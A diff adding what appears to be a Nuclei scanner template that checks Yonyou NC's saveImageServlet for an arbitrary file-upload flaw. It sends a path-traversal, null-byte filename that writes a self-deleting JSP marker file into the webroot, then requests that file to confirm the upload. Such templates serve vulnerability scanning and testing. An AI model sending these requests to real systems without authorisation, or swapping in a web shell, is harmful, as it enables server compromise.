@@ -1,0 +1,36 @@
+id: yonyou-nc-saveImageServlet-fileupload
+
+info:
+  name: yonyou-nc-saveImageServlet-fileupload
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=..\\..\\..\\..\\webapps\\nc_web\\6wexqw.jsp%00 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Connection: close
+        Content-Length: 126
+        Content-Type: application/octet-stream
+        Accept-Encoding: gzip
+
+        <% out.println("2f7ugD57cBoo84t4XpfMoOzR2EV");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+      - |
+        GET /6wexqw.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+        
+    matchers:
+      - type: word
+        words:
+          - "2f7ugD57cBoo84t4XpfMoOzR2EV"
